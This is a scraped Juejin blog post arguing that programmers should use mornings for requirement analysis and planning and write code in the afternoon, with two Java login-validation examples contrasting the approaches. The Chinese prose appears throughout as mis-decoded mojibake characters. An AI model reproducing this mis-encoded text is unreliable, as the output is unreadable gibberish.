content="2026-02-04T02:23:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ©™åºå‘˜å°ç«™"/> <meta itemprop="url" content="https://juejin.cn/user/1546375522426169"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä½ çŸ¥é“çš„ï¼Œæˆ‘ä»¬ä¸Šåˆæ˜¯ä¸å†™ä»£ç çš„ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1546375522426169/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ©™åºå‘˜å°ç«™
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T02:23:31.000Z" title="Wed Feb 04 2026 02:23:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åˆšå…¥èŒçš„å®ä¹ ç”Ÿæ€»ä¼šé—®ï¼šâ€œå“¥ï¼Œä½ ä»¬ä¸ºå•¥ä¸Šåˆéƒ½ä¸å†™ä»£ç å•Šï¼Ÿä¸€ä¸ªä¸ªå¯¹ç€å±å¹•åˆ’æ°´ï¼Œåˆ°äº†ä¸‹åˆå°±è·Ÿæ‰“äº†é¸¡è¡€ä¸€æ ·æ•²é”®ç›˜ï¼Ÿâ€</p>
<p>æˆ‘ç¬‘ç€æ‹äº†æ‹ä»–çš„è‚©è†€ï¼šâ€œè¿™ä¸æ˜¯åˆ’æ°´ï¼Œæ˜¯ç¨‹åºå‘˜çš„â€˜ä¸Šåˆè“„åŠ›æ³•åˆ™â€™â€”â€”çœŸæ­£çš„ç¨‹åºå‘˜ï¼Œä¸Šåˆä»æ¥ä¸æ˜¯ç”¨æ¥å†™ä»£ç çš„ï¼Œè€Œæ˜¯ç”¨æ¥â€˜é¿å…ä¸‹åˆå†™åƒåœ¾ä»£ç â€™çš„ã€‚â€è™½ç„¶è¡¨é¢ä¸Šä½ ä¼šå‡†å¤‡ä»¥ä¸‹å‡ ç§è¯´è¾ï¼š</p>
<ol>
<li>ä¸Šåˆè¦å¼€ä¼šè§£å†³oncallå“ªæœ‰æ—¶é—´å†™å‘€</li>
<li>æ˜¨å¤©åŠ ç­æ™šäº†ï¼Œå¾—å…ˆæŠŠæ˜¨å¤©çš„äº‹æƒ…æ²‰æ·€æ²‰æ·€</li>
<li>å°åŒå¿—ï¼Œä¸Šå•æ‰€ï¼Œæ‰“æ°´ï¼Œåƒåˆé¥­éƒ½è¦æ’é˜Ÿæ»´ï¼Œä¸è¦å¤ªæ€¥ï¼Œç»™è‡ªå·±ç•™ç‚¹buffer~</li>
<li>å“ªæœ‰æ—¶é—´balabalaï¼ŒçœŸç¾¡æ…•ä½ å¯ä»¥æœ‰å¤§å—æ—¶é—´å†™ä»£ç ï¼</li>
</ol>
<p>å¾ˆå¤šå¤–è¡Œäººç”šè‡³åˆšå…¥è¡Œçš„æ–°äººéƒ½ä»¥ä¸ºï¼Œç¨‹åºå‘˜çš„å·¥ä½œå°±æ˜¯â€œååœ¨ç”µè„‘å‰æ•²ä»£ç â€ï¼Œä½†å®é™…ä¸Šï¼Œ<strong>å†™ä»£ç åªå ç¨‹åºå‘˜å·¥ä½œçš„40%ï¼Œå‰©ä¸‹çš„60%ï¼Œå…¨æ˜¯â€œé“ºå«å·¥ä½œâ€</strong> â€”â€”è€Œè¿™äº›é“ºå«ï¼Œæ°æ°æœ€é€‚åˆæ”¾åœ¨ä¸Šåˆå®Œæˆã€‚</p>
<p>ä»Šå¤©å°±ç”¨ç¨‹åºå‘˜èƒ½çœ‹æ‡‚çš„æ–¹å¼ï¼ˆæ¶æ„å›¾ã€æµç¨‹å›¾ã€ä¼ªä»£ç ï¼‰ï¼Œå¥½å¥½èŠèŠï¼šä¸ºå•¥æ­£å¸¸ç¨‹åºå‘˜ï¼Œä¸Šåˆéƒ½ä¸å†™ä»£ç ï¼Ÿ</p>
<h2 data-id="heading-0">å…ˆä¸Šç»“è®ºï¼šä¸Šåˆçš„æ ¸å¿ƒä»»åŠ¡ï¼Œæ˜¯â€œæ‹†è§£é—®é¢˜â€ï¼Œä¸æ˜¯â€œè§£å†³é—®é¢˜â€</h2>
<p>ç¨‹åºå‘˜çš„å·¥ä½œï¼Œæœ¬è´¨ä¸Šæ˜¯â€œå°†å¤æ‚éœ€æ±‚è½¬åŒ–ä¸ºå¯æ‰§è¡Œä»£ç â€çš„è¿‡ç¨‹ã€‚è¿™ä¸ªè¿‡ç¨‹å°±åƒç›–æˆ¿å­ï¼šä¸Šåˆæ˜¯â€œç”»å›¾çº¸ã€å¤‡ææ–™ã€å®šæ–¹æ¡ˆâ€ï¼Œä¸‹åˆæ‰æ˜¯â€œæ¬ç –ç Œå¢™â€ã€‚</p>
<p>å¦‚æœä¸Šåˆç›´æ¥ä¸Šæ‰‹å†™ä»£ç ï¼Œå°±ç›¸å½“äºâ€œæ²¡ç”»å›¾çº¸å°±å¼€å§‹ç Œå¢™â€â€”â€”çœ‹ä¼¼é«˜æ•ˆï¼Œå®åˆ™å¤§æ¦‚ç‡ä¼šå‡ºç°â€œç Œåˆ°ä¸€åŠå‘ç°å¢™æ­ªäº†ã€ææ–™ä¸å¯¹äº†ã€ç»“æ„é”™äº†â€ï¼Œæœ€ååªèƒ½æ¨å€’é‡æ¥ï¼Œåè€Œæ›´æµªè´¹æ—¶é—´ã€‚</p>
<p>æˆ‘ä»¬å…ˆé€šè¿‡ä¸€å¼ <strong>ç¨‹åºå‘˜æ¯æ—¥å·¥ä½œæ¶æ„å›¾</strong>ï¼Œçœ‹çœ‹ä¸Šåˆå’Œä¸‹åˆçš„å·¥ä½œé‡å¿ƒå·®å¼‚ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7376e1eea3a4e71b793b5ce0a489e34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qmZ5bqP5ZGY5bCP56uZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770776838&amp;x-signature=AUtUJLymuyDV4REgwjd5SyMQoPg%3D" alt="image.png" loading="lazy"/></p>
<p>ä»æ¶æ„å›¾èƒ½æ¸…æ™°çœ‹åˆ°ï¼šä¸Šåˆçš„â€œè“„åŠ›å±‚â€æ˜¯ä¸‹åˆâ€œæ‰§è¡Œå±‚â€çš„åŸºç¡€ï¼Œæ²¡æœ‰ä¸Šåˆçš„å……åˆ†å‡†å¤‡ï¼Œä¸‹åˆçš„ä»£ç ç¼–å†™å°±ä¼šå……æ»¡é˜»ç¢â€”â€”è¦ä¹ˆå¡åœ¨æ ¡éªŒé€»è¾‘ï¼Œè¦ä¹ˆåœåœ¨ä¾èµ–ç¼ºå¤±ï¼Œè¦ä¹ˆå†™ä¸€åŠå‘ç°éœ€æ±‚ç†è§£é”™äº†ã€‚</p>
<p>è¿™ä¹Ÿæ˜¯ä¸ºå•¥æˆ‘ä»¬å¸¸è¯´ï¼š<strong>ä¸Šåˆå¤šèŠ±1å°æ—¶æ¢³ç†ï¼Œä¸‹åˆèƒ½çœ3å°æ—¶è¿”å·¥</strong>ã€‚</p>
<h2 data-id="heading-1">æµç¨‹å›¾æ‹†è§£ï¼šä¸Šåˆä¸å†™ä»£ç ï¼Œåˆ°åº•åœ¨å¿™å•¥ï¼Ÿ</h2>
<p>å¾ˆå¤šäººè§‰å¾—â€œä¸Šåˆä¸å†™ä»£ç å°±æ˜¯æ‘¸é±¼â€ï¼Œå…¶å®æ˜¯æ²¡çœ‹åˆ°ç¨‹åºå‘˜ä¸Šåˆçš„â€œéšæ€§å·¥ä½œâ€ã€‚æˆ‘ä»¬ç”¨ä¸€å¼ <strong>ä¸Šåˆå·¥ä½œæµç¨‹å›¾</strong>ï¼Œè¿˜åŸç¨‹åºå‘˜çš„çœŸå®ä¸Šåˆï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c804ef6633f244e3b3dd2aed06a2fd72~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qmZ5bqP5ZGY5bCP56uZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770776838&amp;x-signature=AFTIqo7YDz5EH0woWsGnms0rb4k%3D" alt="image.png" loading="lazy"/></p>
<p>è¿™å¼ æµç¨‹å›¾ï¼Œæ¯ä¸€æ­¥éƒ½åœ¨ä¸ºâ€œä¸‹åˆé«˜æ•ˆå†™ä»£ç â€é“ºè·¯ï¼š</p>
<ul>
<li>
<p>éœ€æ±‚æ¢³ç†ï¼šé¿å…â€œç†è§£åå·®â€å¯¼è‡´ä»£ç è¿”å·¥ï¼›</p>
</li>
<li>
<p>æ–¹æ¡ˆæ¨æ¼”ï¼šé¿å…â€œæŠ€æœ¯é€‰å‹é”™è¯¯â€å¯¼è‡´åæœŸé‡æ„ï¼›</p>
</li>
<li>
<p>ç¯å¢ƒå‡†å¤‡ï¼šé¿å…â€œä¸‹åˆç¼–ç åˆ°ä¸€åŠï¼Œå‘ç°ç¯å¢ƒå´©äº†â€çš„å°´å°¬ã€‚</p>
</li>
</ul>
<p>ä¸¾ä¸ªçœŸå®ä¾‹å­ï¼šä¹‹å‰æœ‰ä¸ªå®ä¹ ç”Ÿï¼Œå…¥èŒç¬¬äºŒå¤©å°±ä¸Šåˆç›´æ¥å†™ä»£ç ï¼Œç»“æœå†™äº†2å°æ—¶ï¼Œå‘ç°è‡ªå·±ç†è§£çš„éœ€æ±‚å’Œäº§å“è¦çš„å®Œå…¨ä¸ä¸€æ ·ï¼Œæ¥å£ä¾èµ–ä¹Ÿæ²¡ç¡®è®¤ï¼Œæœ€ååªèƒ½å…¨éƒ¨åˆ æ‰â€”â€”è¿™å°±æ˜¯â€œä¸Šåˆä¸è“„åŠ›ï¼Œä¸‹åˆç™½è´¹åŠ›â€ã€‚</p>
<h2 data-id="heading-2">ä¼ªä»£ç ä½è¯ï¼šä¸Šåˆå†™ä»£ç ï¼Œä¸ºå•¥æ•ˆç‡æä½ï¼Ÿ</h2>
<p>æˆ‘ä»¬ç”¨ä¸€æ®µâ€œä¼ªä»£ç â€ï¼Œæ¨¡æ‹Ÿâ€œä¸Šåˆç›´æ¥å†™ä»£ç â€å’Œâ€œä¸Šåˆè“„åŠ›ã€ä¸‹åˆå†™ä»£ç â€çš„æ•ˆç‡å·®å¼‚ï¼Œå°±èƒ½ç›´è§‚æ„Ÿå—åˆ°ä¸ºå•¥ä¸Šåˆä¸é€‚åˆå†™ä»£ç ã€‚</p>
<h3 data-id="heading-3">åœºæ™¯ï¼šå®ç°ä¸€ä¸ªâ€œç”¨æˆ·ç™»å½•æ ¡éªŒâ€åŠŸèƒ½</h3>
<h4 data-id="heading-4">åé¢æ¡ˆä¾‹ï¼šä¸Šåˆç›´æ¥å†™ä»£ç ï¼ˆæ•ˆç‡æä½ï¼‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸Šåˆ9:30ï¼Œç›´æ¥ä¸Šæ‰‹å†™ä»£ç ï¼Œæœªæ¢³ç†éœ€æ±‚å’Œä¾èµ–</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginController</span> {
    <span class="hljs-comment">// 1. æœªç¡®è®¤éœ€æ±‚ï¼šä¸çŸ¥é“éœ€è¦æ ¡éªŒæ‰‹æœºå·/é‚®ç®±ï¼Œè¿˜æ˜¯ä¸¤è€…éƒ½æ”¯æŒ</span>
    <span class="hljs-comment">// 2. æœªç¡®è®¤ä¾èµ–ï¼šä¸çŸ¥é“ç”¨æˆ·æ•°æ®åº“æ¥å£æ˜¯å¦å°±ç»ª</span>
    <span class="hljs-comment">// 3. æœªæ¨æ¼”é€»è¾‘ï¼šæœªè€ƒè™‘å¯†ç åŠ å¯†ã€tokenç”Ÿæˆã€å¼‚å¸¸å¤„ç†</span>
    
    <span class="hljs-keyword">public</span> Result <span class="hljs-title function_">login</span><span class="hljs-params">(String account, String password)</span> {
        <span class="hljs-comment">// ç¬¬ä¸€æ­¥ï¼šå†™ç™»å½•æ ¡éªŒï¼Œå‘ç°ä¸çŸ¥é“accountæ”¯æŒä»€ä¹ˆæ ¼å¼</span>
        <span class="hljs-keyword">if</span> (account == <span class="hljs-literal">null</span> || account.isEmpty()) {
            <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">"è´¦å·ä¸èƒ½ä¸ºç©º"</span>);
        }
        <span class="hljs-comment">// æ­¤æ—¶æ‰å»é—®äº§å“ï¼šè´¦å·æ”¯æŒæ‰‹æœºå·è¿˜æ˜¯é‚®ç®±ï¼Ÿï¼ˆæµªè´¹10minï¼‰</span>
        <span class="hljs-comment">// äº§å“å›å¤ï¼šä¸¤è€…éƒ½æ”¯æŒï¼Œéœ€è¦åˆ†åˆ«æ ¡éªŒæ ¼å¼</span>
        <span class="hljs-comment">// è¿”å·¥ï¼šæ·»åŠ æ ¼å¼æ ¡éªŒ</span>
        <span class="hljs-keyword">if</span> (!isPhone(account) &amp;&amp; !isEmail(account)) {
            <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">"è´¦å·æ ¼å¼é”™è¯¯ï¼ˆæ‰‹æœºå·/é‚®ç®±ï¼‰"</span>);
        }
        
        <span class="hljs-comment">//------------------------------------</span>
        <span class="hljs-comment">// *****è€æ¿ï¼šæ˜¨å¤©çš„ä¼šè®®å¾…åŠå’±å¯¹ä¸€ä¸‹~~~~</span>
        <span class="hljs-comment">//------------------------------------</span>
        
        <span class="hljs-comment">// ç¬¬äºŒæ­¥ï¼šæŸ¥è¯¢ç”¨æˆ·ï¼Œå‘ç°æ•°æ®åº“æ¥å£æœªå¯¹æ¥ï¼ˆæµªè´¹20minï¼‰</span>
        <span class="hljs-type">UserService</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserService</span>();
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">try</span> {
            user = userService.getUserByAccount(account);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-comment">// æ’æŸ¥å‘ç°ï¼šæ•°æ®åº“è¿æ¥æœªé…ç½®ï¼Œæ¥å£æœªå¼€å‘å®Œæˆ</span>
            <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">"æœåŠ¡å¼‚å¸¸ï¼Œè¯·ç¨åå†è¯•"</span>);
        }
        
        <span class="hljs-comment">// ç¬¬ä¸‰æ­¥ï¼šå¯†ç æ ¡éªŒï¼Œå‘ç°æœªç¡®è®¤å¯†ç åŠ å¯†æ–¹å¼ï¼ˆæµªè´¹15minï¼‰</span>
        <span class="hljs-comment">// å»é—®åç«¯åŒäº‹ï¼šå¯†ç æ˜¯MD5åŠ å¯†è¿˜æ˜¯BCryptåŠ å¯†ï¼Ÿ</span>
        <span class="hljs-comment">// åŒäº‹å›å¤ï¼šBCryptåŠ å¯†ï¼Œéœ€è¦è°ƒç”¨å·¥å…·ç±»</span>
        <span class="hljs-comment">// è¿”å·¥ï¼šæ·»åŠ å¯†ç åŠ å¯†æ ¡éªŒ</span>
        <span class="hljs-keyword">if</span> (!BCrypt.checkpw(password, user.getPassword())) {
            <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">"å¯†ç é”™è¯¯"</span>);
        }
        
        <span class="hljs-comment">//------------------------------</span>
        <span class="hljs-comment">// *****æ’å…¥äº‹é¡¹ï¼šçº¿ä¸Šæ¥é—®é¢˜äº†~~~~</span>
        <span class="hljs-comment">//------------------------------</span>
        
        <span class="hljs-comment">// ç¬¬å››æ­¥ï¼šç”Ÿæˆtokenï¼Œæœªè€ƒè™‘tokenè¿‡æœŸæ—¶é—´ï¼ˆæµªè´¹10minï¼‰</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> TokenUtil.generateToken(user.getId());
        <span class="hljs-comment">// äº§å“æé†’ï¼štokenè¿‡æœŸæ—¶é—´éœ€è¦è®¾ä¸º2å°æ—¶</span>
        <span class="hljs-comment">// è¿”å·¥ï¼šä¿®æ”¹tokenç”Ÿæˆé€»è¾‘</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> TokenUtil.generateToken(user.getId(), <span class="hljs-number">7200</span>);
        
        <span class="hljs-comment">// ç¬¬äº”æ­¥ï¼šæœªè€ƒè™‘å¼‚å¸¸åœºæ™¯ï¼ˆå¦‚ç”¨æˆ·è¢«ç¦ç”¨ï¼‰</span>
        <span class="hljs-comment">// æµ‹è¯•æé†’ï¼šéœ€è¦æ ¡éªŒç”¨æˆ·çŠ¶æ€</span>
        <span class="hljs-comment">// è¿”å·¥ï¼šæ·»åŠ ç”¨æˆ·çŠ¶æ€æ ¡éªŒ</span>
        <span class="hljs-keyword">if</span> (user.getStatus() == <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">"è´¦å·å·²è¢«ç¦ç”¨"</span>);
        }
        
        <span class="hljs-keyword">return</span> Result.success(token);
    }
    
    <span class="hljs-comment">// é¢å¤–æµªè´¹æ—¶é—´ï¼šä¸Šåˆæ€è·¯æ··ä¹±ï¼Œä»£ç å†—ä½™ã€æ ¼å¼ä¸è§„èŒƒï¼Œä¸‹åˆè¿˜éœ€è¦é‡æ„ï¼ˆæµªè´¹30minï¼‰</span>
}

</code></pre>
<p>ç»Ÿè®¡ï¼šä¸Šåˆå†™ä»£ç ï¼Œæ€»å…±èŠ±è´¹2å°æ—¶ï¼Œå…¶ä¸­è¿”å·¥+ç­‰å¾…æ—¶é—´å 1å°æ—¶45minï¼Œæœ‰æ•ˆç¼–ç æ—¶é—´ä»…15min ã€‚ã€‚ã€‚</p>
<h4 data-id="heading-5">æ­£é¢æ¡ˆä¾‹ï¼šä¸Šåˆè“„åŠ›ï¼Œä¸‹åˆå†™ä»£ç ï¼ˆæ•ˆç‡æé«˜ï¼‰</h4>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-comment">// ä¸Šåˆ9:30-12:00ï¼Œè“„åŠ›å‡†å¤‡ï¼ˆä¸å†™æ ¸å¿ƒä»£ç ï¼‰</span>
    <span class="hljs-comment">// 1. éœ€æ±‚æ¢³ç†ï¼ˆ30minï¼‰ï¼šç¡®è®¤è´¦å·æ”¯æŒæ‰‹æœºå·/é‚®ç®±ï¼Œéœ€è¦æ ¡éªŒæ ¼å¼ï¼›å¯†ç BCryptåŠ å¯†ï¼›tokenè¿‡æœŸ2å°æ—¶ï¼›æ ¡éªŒç”¨æˆ·çŠ¶æ€</span>
    <span class="hljs-comment">// 2. ä¾èµ–ç¡®è®¤ï¼ˆ20minï¼‰ï¼šç¡®è®¤ç”¨æˆ·æ•°æ®åº“æ¥å£å·²å¼€å‘å®Œæˆï¼Œæ•°æ®åº“è¿æ¥é…ç½®å°±ç»ªï¼›Tokenå·¥å…·ç±»å¯ç”¨</span>
    <span class="hljs-comment">// 3. é€»è¾‘æ¨æ¼”ï¼ˆ40minï¼‰ï¼šæ¢³ç†æ‰§è¡Œæµç¨‹ï¼Œé¢„åˆ¤å¼‚å¸¸åœºæ™¯ï¼ˆè´¦å·ä¸ºç©ºã€æ ¼å¼é”™è¯¯ã€å¯†ç é”™è¯¯ã€ç”¨æˆ·ç¦ç”¨ã€æœåŠ¡å¼‚å¸¸ï¼‰</span>
    <span class="hljs-comment">// 4. å‡†å¤‡æµ‹è¯•ç”¨ä¾‹ï¼ˆ20minï¼‰ï¼šè®¾è®¡æ­£å¸¸ç™»å½•ã€å¼‚å¸¸åœºæ™¯çš„æµ‹è¯•æ•°æ®</span>

    <span class="hljs-comment">// ä¸‹åˆ14:00ï¼Œå¼€å§‹å†™ä»£ç ï¼ˆæ€è·¯æ¸…æ™°ï¼Œæ— è¿”å·¥ï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginController</span> {
        <span class="hljs-meta">@Autowired</span>
        <span class="hljs-keyword">private</span> UserService userService;
        
        <span class="hljs-keyword">public</span> Result <span class="hljs-title function_">login</span><span class="hljs-params">(String account, String password)</span> {
            <span class="hljs-comment">// 1. è´¦å·éç©ºæ ¡éªŒ</span>
            <span class="hljs-keyword">if</span> (account == <span class="hljs-literal">null</span> || account.isEmpty()) {
                <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">"è´¦å·ä¸èƒ½ä¸ºç©º"</span>);
            }
            <span class="hljs-comment">// 2. è´¦å·æ ¼å¼æ ¡éªŒï¼ˆæ‰‹æœºå·/é‚®ç®±ï¼‰</span>
            <span class="hljs-keyword">if</span> (!isPhone(account) &amp;&amp; !isEmail(account)) {
                <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">"è´¦å·æ ¼å¼é”™è¯¯ï¼ˆæ‰‹æœºå·/é‚®ç®±ï¼‰"</span>);
            }
            <span class="hljs-comment">// 3. æŸ¥è¯¢ç”¨æˆ·ï¼Œå¤„ç†æœåŠ¡å¼‚å¸¸</span>
            User user;
            <span class="hljs-keyword">try</span> {
                user = userService.getUserByAccount(account);
            } <span class="hljs-keyword">catch</span> (Exception e) {
                log.error(<span class="hljs-string">"æŸ¥è¯¢ç”¨æˆ·å¼‚å¸¸ï¼š{}"</span>, e.getMessage());
                <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">"æœåŠ¡å¼‚å¸¸ï¼Œè¯·ç¨åå†è¯•"</span>);
            }
            <span class="hljs-comment">// 4. ç”¨æˆ·ä¸å­˜åœ¨æ ¡éªŒ</span>
            <span class="hljs-keyword">if</span> (user == <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">"è´¦å·æˆ–å¯†ç é”™è¯¯"</span>);
            }
            <span class="hljs-comment">// 5. å¯†ç æ ¡éªŒï¼ˆBCryptåŠ å¯†ï¼‰</span>
            <span class="hljs-keyword">if</span> (!BCrypt.checkpw(password, user.getPassword())) {
                <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">"è´¦å·æˆ–å¯†ç é”™è¯¯"</span>);
            }
            <span class="hljs-comment">// 6. ç”¨æˆ·çŠ¶æ€æ ¡éªŒï¼ˆæœªç¦ç”¨ï¼‰</span>
            <span class="hljs-keyword">if</span> (user.getStatus() == <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">"è´¦å·å·²è¢«ç¦ç”¨"</span>);
            }
            <span class="hljs-comment">// 7. ç”Ÿæˆtokenï¼ˆè¿‡æœŸ2å°æ—¶ï¼‰</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> TokenUtil.generateToken(user.getId(), <span class="hljs-number">7200</span>);
            
            <span class="hljs-keyword">return</span> Result.success(token);
        }
    }
</code></pre>
<p>ç»Ÿè®¡ï¼šä¸‹åˆå†™ä»£ç ï¼Œæ€»å…±èŠ±è´¹40minï¼Œæ— è¿”å·¥ï¼Œä»£ç è§„èŒƒï¼Œå¯ç›´æ¥æµ‹è¯•</p>
<p>ä¸¤æ®µä¼ªä»£ç å¯¹æ¯”ï¼Œå·®è·ä¸€ç›®äº†ç„¶ï¼šä¸Šåˆç›´æ¥å†™ä»£ç ï¼Œå¤§éƒ¨åˆ†æ—¶é—´éƒ½æµªè´¹åœ¨â€œè¿”å·¥ã€ç­‰å¾…ã€æ’æŸ¥é—®é¢˜â€ä¸Šï¼›è€Œä¸Šåˆåšå¥½è“„åŠ›å‡†å¤‡ï¼Œä¸‹åˆå†™ä»£ç å°±èƒ½â€œä¸€æ°”å‘µæˆâ€ï¼Œæ•ˆç‡æå‡3å€ä»¥ä¸Šã€‚</p>
